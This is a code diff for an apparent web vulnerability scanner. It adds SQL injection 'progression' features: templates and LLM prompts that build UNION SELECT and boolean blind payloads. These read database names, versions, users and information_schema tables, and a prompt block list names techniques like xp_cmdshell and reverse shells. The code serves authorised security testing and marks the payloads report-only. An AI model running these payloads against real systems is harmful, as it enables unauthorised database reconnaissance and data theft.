@@ -6,7 +6,7 @@ import ipaddress
 import json
 import re
 from typing import Any
-from urllib.parse import urlparse
+from urllib.parse import parse_qs, urlparse
 
 from backend.helper.llm.client import LLMClient
 from backend.helper.settings import RuntimeSettings
@@ -16,6 +16,9 @@ ADVISORY_CATEGORIES = {
     "sqli": "sqli",
     "sql injection": "sqli",
     "sql_injection": "sqli",
+    "sql_progression": "sqli",
+    "sqli_progression": "sqli",
+    "confirmed_sqli": "sqli",
     "blind_sqli": "sqli_blind",
     "sqli_blind": "sqli_blind",
     "blind sql injection": "sqli_blind",
@@ -75,6 +78,8 @@ class PayloadSafetyFilter:
         if lowered in ADVISORY_CATEGORIES:
             return ADVISORY_CATEGORIES[lowered]
         payload_lower = payload.lower()
+        if "union select" in payload_lower or "information_schema" in payload_lower:
+            return "sqli"
         if any(token in payload_lower for token in ("1=1", "1=2", " or ", " and ")):
             return "sqli_blind" if "1=2" in payload_lower else "sqli"
         if "<script" in payload_lower or "onerror=" in payload_lower or "svg/onload" in payload_lower:
@@ -176,6 +181,7 @@ class LLMPayloadAdvisor:
         if not self.settings.llm_payload_advisor:
             return self._empty("disabled", "候选 Payload 功能未启用")
 
+        confirmed_findings = self._confirmed_findings(findings)
         local_candidates = self._local_candidates(webscan, findings)
         llm_candidates: list[dict[str, Any]] = []
         llm_error = ""
@@ -186,6 +192,15 @@ class LLMPayloadAdvisor:
                 llm_candidates = self._parse_candidates(raw)
                 for item in llm_candidates:
                     item.setdefault("source", "llm")
+                if confirmed_findings:
+                    raw_progression = self.llm.chat(
+                        self._progression_system_prompt(),
+                        self._progression_user_prompt(webscan, confirmed_findings),
+                    )
+                    progression_candidates = self._parse_candidates(raw_progression)
+                    for item in progression_candidates:
+                        item["source"] = "llm_progression"
+                    llm_candidates.extend(progression_candidates)
             except Exception as exc:
                 llm_error = str(exc)
         elif self.settings.llm_enabled:
@@ -244,6 +259,7 @@ class LLMPayloadAdvisor:
 
     def _local_candidates(self, webscan: dict, findings: list[dict]) -> list[dict[str, Any]]:
         candidates: list[dict[str, Any]] = []
+        candidates.extend(self._confirmed_progression_candidates(webscan, findings))
         for point in self._collect_input_points(webscan):
             name = point.get("name", "")
             url = point.get("url", "")
@@ -252,6 +268,160 @@ class LLMPayloadAdvisor:
             for category in hints:
                 candidates.extend(self._template_candidates(url, name, category))
         return candidates
+
+    def _confirmed_findings(self, findings: list[dict]) -> list[dict]:
+        return [item for item in findings if item.get("status") == "确认漏洞"]
+
+    def _confirmed_progression_candidates(self, webscan: dict, findings: list[dict]) -> list[dict[str, Any]]:
+        candidates: list[dict[str, Any]] = []
+        for finding in self._confirmed_findings(findings):
+            category = str(finding.get("category") or "").strip().lower()
+            if category == "sqli":
+                candidates.extend(self._sqli_progression_candidates(webscan, finding))
+            elif category == "sqli_blind":
+                candidates.extend(self._blind_sqli_progression_candidates(webscan, finding))
+        return candidates
+
+    def _sqli_progression_candidates(self, webscan: dict, finding: dict) -> list[dict[str, Any]]:
+        evidence = finding.get("request_response") or {}
+        followup = evidence.get("followup") or {}
+        column_count = self._safe_int(followup.get("column_count"))
+        if column_count <= 0:
+            return []
+
+        finding_url = str(finding.get("url") or webscan.get("final_url") or webscan.get("target") or "")
+        target_param = self._target_param_from_finding(finding)
+        if not target_param:
+            return []
+
+        input_point = self._input_point_for_param(webscan, target_param, finding_url)
+        display_positions = self._reflected_union_positions(followup, column_count)
+        primary = display_positions[0] if display_positions else min(2, column_count)
+        secondary = display_positions[1] if len(display_positions) > 1 else primary
+
+        payload_specs = [
+            (
+                {primary: "database()"},
+                "确认 SQLi 后的只读推进候选：读取当前数据库名",
+                f"响应中应在 UNION 回显位置出现当前数据库名；列数参考 column_count={column_count}。",
+            ),
+            (
+                {primary: "version()"},
+                "确认 SQLi 后的只读推进候选：读取数据库版本",
+                f"响应中应出现数据库版本信息；列数参考 column_count={column_count}。",
+            ),
+            (
+                {primary: "user()"},
+                "确认 SQLi 后的只读推进候选：读取当前数据库用户",
+                f"响应中应出现当前数据库连接用户；列数参考 column_count={column_count}。",
+            ),
+            (
+                {primary: "table_name"},
+                "确认 SQLi 后的只读推进候选：枚举当前库的一个表名",
+                "响应中应出现当前数据库中的表名，可用于判断后续手工验证方向。",
+                " FROM information_schema.tables WHERE table_schema=database() LIMIT 1",
+            ),
+            (
+                {primary: "column_name", secondary: "table_name"} if secondary != primary else {primary: "column_name"},
+                "确认 SQLi 后的只读推进候选：枚举当前库的一个字段名",
+                "响应中应出现字段名，若同时存在第二个回显位也会显示表名。",
+                " FROM information_schema.columns WHERE table_schema=database() LIMIT 1",
+            ),
+        ]
+
+        candidates: list[dict[str, Any]] = []
+        for spec in payload_specs:
+            replacements, purpose, expected_signal = spec[:3]
+            suffix = spec[3] if len(spec) > 3 else ""
+            candidates.append(
+                {
+                    "source": "local_progression_template",
+                    "input_point": input_point,
+                    "category": "sqli_progression",
+                    "target_param": target_param,
+                    "payload": self._union_payload(column_count, replacements, suffix),
+                    "purpose": purpose,
+                    "expected_signal": expected_signal,
+                    "risk_note": "仅作为确认漏洞后的推进参考写入报告，NOVA 不会自动执行这些候选 payload。",
+                }
+            )
+        return candidates
+
+    def _blind_sqli_progression_candidates(self, webscan: dict, finding: dict) -> list[dict[str, Any]]:
+        finding_url = str(finding.get("url") or webscan.get("final_url") or webscan.get("target") or "")
+        target_param = self._target_param_from_finding(finding)
+        if not target_param:
+            return []
+        input_point = self._input_point_for_param(webscan, target_param, finding_url)
+        return [
+            {
+                "source": "local_progression_template",
+                "input_point": input_point,
+                "category": "sqli_blind",
+                "target_param": target_param,
+                "true_payload": "1' AND LENGTH(database())>0 #",
+                "false_payload": "1' AND LENGTH(database())=0 #",
+                "expected_true_signal": "true 条件响应应接近基线或已确认的存在态响应。",
+                "expected_false_signal": "false 条件响应应与 true 条件存在稳定差异。",
+                "purpose": "确认布尔型 SQLi 后的只读推进候选：验证 database() 是否可被条件表达式影响",
+                "risk_note": "仅写入报告作为手工参考，不自动请求目标。",
+            }
+        ]
+
+    def _target_param_from_finding(self, finding: dict) -> str:
+        parsed = urlparse(str(finding.get("url") or ""))
+        query = parse_qs(parsed.query, keep_blank_values=True)
+        if not query:
+            return ""
+        preferred_names = {"id", "uid", "user", "userid", "user_id", "pid", "cat", "category"}
+        for name, values in query.items():
+            joined = " ".join(values).lower()
+            if name.lower() in preferred_names or any(token in joined for token in ("'", " order by ", " union ", " and ", " or ")):
+                return name
+        for name in query:
+            if name.lower() not in {"submit", "button"}:
+                return name
+        return next(iter(query))
+
+    def _input_point_for_param(self, webscan: dict, target_param: str, fallback_url: str) -> str:
+        fallback = urlparse(fallback_url)
+        for point in self._collect_input_points(webscan):
+            if str(point.get("name") or "") != target_param:
+                continue
+            point_url = str(point.get("url") or "")
+            parsed = urlparse(point_url)
+            if not fallback_url or (parsed.netloc == fallback.netloc and parsed.path == fallback.path):
+                return point_url
+        return fallback_url
+
+    def _reflected_union_positions(self, followup: dict, column_count: int) -> list[int]:
+        reflected = (followup.get("union_probe") or {}).get("reflected_markers") or []
+        positions: list[int] = []
+        for marker in reflected:
+            match = re.search(r"NOVA(\d+)", str(marker))
+            if not match:
+                continue
+            position = self._safe_int(match.group(1))
+            if 1 <= position <= column_count and position not in positions:
+                positions.append(position)
+        if positions:
+            return positions
+        if column_count >= 3:
+            return [2, 3]
+        return [column_count]
+
+    def _union_payload(self, column_count: int, replacements: dict[int, str], suffix: str = "") -> str:
+        columns = [str(index) for index in range(1, column_count + 1)]
+        for position, expression in replacements.items():
+            if 1 <= position <= column_count:
+                columns[position - 1] = expression
+        return f"-1' UNION SELECT {','.join(columns)}{suffix}-- "
+
+    def _safe_int(self, value: object) -> int:
+        try:
+            return int(value)
+        except (TypeError, ValueError):
+            return 0
 
     def _collect_input_points(self, webscan: dict) -> list[dict[str, Any]]:
         points: list[dict[str, Any]] = []
@@ -414,7 +584,7 @@ class LLMPayloadAdvisor:
     def _dedupe_candidates(self, candidates: list[dict[str, Any]]) -> list[dict[str, Any]]:
         seen: set[tuple[str, str, str, str, str]] = set()
         result: list[dict[str, Any]] = []
-        for candidate in candidates:
+        for candidate in self._prioritize_candidates(candidates):
             key = (
                 str(candidate.get("input_point") or ""),
                 str(candidate.get("target_param") or ""),
@@ -432,12 +602,23 @@ class LLMPayloadAdvisor:
         counts: dict[tuple[str, str], int] = {}
         selected: list[dict[str, Any]] = []
         max_per_param = max(1, self.settings.llm_payload_max_per_param)
-        for candidate in candidates:
+        for candidate in self._prioritize_candidates(candidates):
             key = (str(candidate.get("input_point") or ""), str(candidate.get("target_param") or ""))
             counts[key] = counts.get(key, 0) + 1
             if counts[key] <= max_per_param:
                 selected.append(candidate)
         return selected
+
+    def _prioritize_candidates(self, candidates: list[dict[str, Any]]) -> list[dict[str, Any]]:
+        source_priority = {
+            "llm_progression": 0,
+            "local_progression_template": 1,
+            "local_template": 2,
+            "llm": 3,
+        }
+        indexed = list(enumerate(candidates))
+        indexed.sort(key=lambda item: (source_priority.get(str(item[1].get("source") or ""), 9), item[0]))
+        return [candidate for _, candidate in indexed]
 
     def _parse_candidates(self, raw: str) -> list[dict[str, Any]]:
         if not raw or not raw.strip():
@@ -474,6 +655,73 @@ class LLMPayloadAdvisor:
             "xp_cmdshell、反弹 shell、写文件、长时间 SLEEP/BENCHMARK。"
         )
 
+    def _progression_system_prompt(self) -> str:
+        return (
+            "你是 NOVA Confirmed Vulnerability Payload Advisor。输入中的漏洞已经由本地规则和响应证据确认，"
+            "你的任务是生成报告参考用的后续推进候选 payload，不能重新判断漏洞是否存在。"
+            "必须只返回严格 JSON，格式为 {\"payloads\": [...]}，不要 Markdown，不要解释性散文。"
+            "候选 payload 第一版只写入报告，不自动执行，也不能作为漏洞确认依据。"
+            "对于 SQLi，请优先利用 column_count、reflected_markers、已执行 payload 推导只读 UNION/布尔推进候选。"
+            "禁止生成 DROP、DELETE、UPDATE、INSERT、ALTER、TRUNCATE、INTO OUTFILE、LOAD_FILE、xp_cmdshell、"
+            "反弹 shell、写文件、删文件、长时间 SLEEP/BENCHMARK 或批量数据拖取 payload。"
+            "不要输出用于读取系统文件、写 webshell、绕过认证或破坏业务状态的 payload。"
+        )
+
+    def _progression_user_prompt(self, webscan: dict, confirmed_findings: list[dict]) -> str:
+        compact_findings = []
+        for finding in confirmed_findings[:5]:
+            evidence = finding.get("request_response") or {}
+            compact_findings.append(
+                {
+                    "id": finding.get("id"),
+                    "title": finding.get("title"),
+                    "category": finding.get("category"),
+                    "url": finding.get("url"),
+                    "evidence": finding.get("evidence"),
+                    "executed_payloads": finding.get("payloads", [])[:12],
+                    "followup": evidence.get("followup", {}),
+                }
+            )
+
+        return json.dumps(
+            {
+                "target": webscan.get("target"),
+                "final_url": webscan.get("final_url"),
+                "confirmed_findings": compact_findings,
+                "requirements": {
+                    "language": "zh-CN",
+                    "report_only": True,
+                    "do_not_confirm_vulnerabilities": True,
+                    "prefer_read_only_progression": True,
+                    "max_per_param": self.settings.llm_payload_max_per_param,
+                    "allowed_examples": [
+                        "-1' UNION SELECT 1,database(),3-- ",
+                        "-1' UNION SELECT 1,version(),3-- ",
+                        "-1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 1-- ",
+                    ],
+                },
+                "output_schema": {
+                    "payloads": [
+                        {
+                            "input_point": "confirmed finding url or original input point",
+                            "category": "sqli_progression|sqli|sqli_blind|xss",
+                            "target_param": "parameter name",
+                            "payload": "single candidate payload, or omit when using true/false pair",
+                            "true_payload": "optional blind SQLi true case",
+                            "false_payload": "optional blind SQLi false case",
+                            "purpose": "Chinese short purpose",
+                            "expected_signal": "Chinese expected response signal",
+                            "expected_true_signal": "optional Chinese true signal",
+                            "expected_false_signal": "optional Chinese false signal",
+                            "risk_note": "Chinese short risk note, must mention report-only",
+                        }
+                    ]
+                },
+            },
+            ensure_ascii=False,
+            indent=2,
+        )
+
     def _user_prompt(self, webscan: dict, findings: list[dict]) -> str:
         pages = webscan.get("pages") or [webscan]
         compact_pages = []
@@ -501,7 +749,7 @@ class LLMPayloadAdvisor:
                 "pages": compact_pages,
                 "findings": findings[:10],
                 "requirements": {
-                    "categories": ["sqli", "sqli_blind", "xss", "lfi", "command_injection", "traversal"],
+                    "categories": ["sqli", "sqli_progression", "sqli_blind", "xss", "lfi", "command_injection", "traversal"],
                     "max_per_param": self.settings.llm_payload_max_per_param,
                     "do_not_repeat_same_payload_for_all_inputs": True,
                     "blind_sqli_pair_schema": {
@@ -515,7 +763,7 @@ class LLMPayloadAdvisor:
                     "payloads": [
                         {
                             "input_point": "url or form action",
-                            "category": "sqli|sqli_blind|xss|lfi|command_injection|traversal",
+                            "category": "sqli|sqli_progression|sqli_blind|xss|lfi|command_injection|traversal",
                             "target_param": "parameter name",
                             "payload": "single candidate payload, or omit when using true/false pair",
                             "true_payload": "optional blind SQLi true case",
